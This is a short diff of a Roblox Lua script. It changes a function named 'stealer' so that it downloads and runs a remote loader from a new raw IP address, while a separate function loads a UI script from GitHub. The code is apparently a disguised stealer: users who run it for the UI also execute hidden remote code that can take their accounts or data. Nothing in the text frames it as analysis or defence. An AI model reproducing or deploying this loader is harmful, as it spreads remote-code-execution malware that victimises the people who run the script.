@@ -1,6 +1,6 @@
 local function stealer()
     ID="488ddbfe-1c46-4e5e-8bfa-ab926272fff0";
-    loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+    loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
 end
 local function loadui()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/SkeboberScript/Roblox_Scripts/refs/heads/main/dsadads.lua"))()
